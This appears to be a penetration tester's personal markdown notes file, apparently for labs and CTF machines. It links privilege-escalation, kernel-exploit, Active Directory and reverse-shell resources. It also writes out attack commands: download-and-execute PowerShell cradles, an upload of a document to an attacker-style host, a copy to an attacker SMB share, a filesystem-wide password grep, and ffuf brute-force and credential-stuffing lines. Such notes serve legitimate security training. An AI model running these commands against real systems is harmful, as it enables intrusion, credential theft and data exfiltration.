# My notes

###### My General Notes.

  This notes contains link of tools, link of cheatsheets, Commands etc.

## Python pip

1. `Python2 -m pip YOUR_COMMAND` OR `pip2 YOUR_COMMAND`

2. `Python3 -m pip YOUR_COMMAND` OR `pip3 YOUR_COMMAND`

## Python3 server

1. Local server in current directory: `python3 -m http.server PORT`

2. Local server in specified directory:

    `python3 -m http.server PORT --directory DIRECTORY`

## Msfvenom CheatSheet

[MSFVenom - CheatSheet - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)

## Peas Family

LinPeas and Winpeas located ate my [`Privesc_scripts`](https://github.com/CalegariMindSec/Privesc_scripts) repository.

[GitHub - carlospolop/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/PEASS-ng)

## Windows PrivEsc Scripts

[`My Privesc Scripts - Windows`](https://github.com/CalegariMindSec/Privesc_scripts/tree/main/Windows_Privesc)

[PowerSploit/Privesc at master · PowerShellMafia/PowerSploit · GitHub](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

[GitHub - bitsadmin/wesng: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

[GitHub - 7Ragnarok7/Windows-Exploit-Suggester-2: A tool to recommend available exploits for Windows Operating Systems](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)

[GitHub - r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[GhostPack · GitHub](https://github.com/GhostPack)

### Windows PrivEsc Kernel Exploits

[Windows Exploits](https://github.com/abatchy17/WindowsExploits)

[GitHub - SecWiki/windows-kernel-exploits: windows-kernel-exploits Windows平台提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)

[Exploitdb-bin-sploits/bin-sploits at master · offensive-security/exploitdb-bin-sploits · GitHub](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)

### Windows PrivEsc CheatSheet

[Windows Local Privilege Escalation - HackTricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

[Notes TCM Course](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)

[PayloadAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Linux PrivEsc Cheatsheet

[`My Privesc Scripts - Linux`](https://github.com/CalegariMindSec/Privesc_scripts/tree/main/Linux_Privesc)

[Linux Privilege Escalation - HackTricks Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

[PayloadAllTheThings - Linux ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Windows Binaries

[LOLBAS Project](https://lolbas-project.github.io/)

### Unix Binaries

[GTFOBins](https://gtfobins.github.io/)

### Listerners (Better Alternatives to Netcat)

[Netpwn](https://github.com/anthares101/netpwn)

[Pwncat](https://github.com/calebstewart/pwncat)

### File Download - Windows

1. ```powershell
   certutil.exe -urlcache -f http://IP:PORT/FILE.exe FILE.exe
   ```

2. ```powershell
   powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'C:\FULL\PATH\FILE')
   ```

3. ```powershell
   powershell.exe -command iwr -Uri http://IP:PORT/FILE -OutFile "C:\PATH\FILE"
   ```

4. ```powershell
    powershell.exe wget http://IP:PORT/FILE -OutFile FILE
   ```

5. ```powershell
   powershell iex(new-object net.webclient).downloadstring('http://IP:PORT/FILE')
   ```

6. ```powershell
   Start-BitsTransfer -Source https://IP:PORT/FILE -Destination "C:\FULL\PATH\FILE"
   ```
7. ```python3
   impacket-smbserver share . -smb2support (Attacker Machine)
   copy C:\File\To\PATH \\AttackerIP\share\
   ```

### File Upload - Windows

1. ```powershell
   powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
   ```

### File Download - Linux

1. ```bash
   wget http://IP:PORT/FILE
   ```

2. ```bash
   curl http://IP:PORT/FILE -o FILE
   ```

### Python3 tty Shell Spawning

1. ```python
   python -c 'import pty; pty.spawn("/bin/sh")'
   ```

2. ```python
   python3 -c 'import pty; pty.spawn("/bin/sh")'
   ```

### Active Directory Exploitation

[GitHub - S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
[CME cheat sheet](https://wiki.porchetta.industries/)
[Kerberos Attack](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Reverse shell

[Reverse Shell Generator](https://www.revshells.com/)
[Reverse shell cheat sheet PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Find Passwords Linux

  *
      ```
      grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
      ```

### Download Scripts From SBM Netlogon and Sysvol

  *
    ```
    smbmap -u <user> -p '<password>' -d <domain> -H <dc-ip> -R SYSVOL --depth 10 -A "^.*\.(vbs|ps1|bat|vbe)$"
    ```

  *
    ```
    smbmap -u <user> -p '<password>' -d <domain> -H <dc-ip> -R NETLOGON --depth 10 -A "^.*\.(vbs|ps1|bat|vbe)$"
    ```

### FFUF Brute Force And Credential Stuffing

  * Brute Force - Example:
    ```
    ffuf -request req.txt -w xato-net-10-million-passwords-10000.txt -request-proto http -fc 401
    ```

  * Credential Stuffing - Example:
    ```
    ffuf -request req.txt -w user:FUZZ1 -w pass:FUZZ2 -request-proto http -mode pitchfork -x http://127.0.0.1:8080 -fc 401
    ```

### Kali Linux Windows Features

  * 1) [pwsh](https://www.kali.org/tools/powershell/) - Powershell Terminal
  * 2) [wine](https://www.winehq.org/) - Run Run Windows applications on Linux, BSD, Solaris
    * 2.1) [Install](https://techviewleo.com/how-to-install-wine-on-kali-linux/)
  * 3) [mono](https://www.mono-project.com/) - Mono is a software platform designed to allow developers to easily create cross platform applications
    * 3.1) [Install](https://linuxize.com/post/how-to-install-mono-on-ubuntu-20-04/)
  * 4) [ILspycmd](https://github.com/icsharpcode/ILSpy/tree/master/ICSharpCode.ILSpyCmd)
    * 4.1) [Install](https://www.nuget.org/packages/ilspycmd/)
    * 4.2) [Usage Example - HTB Support Machine Writeup]()
    * 4.3) **Command example:** ilspycmd FILE.exe -p -o /Path/To/File/
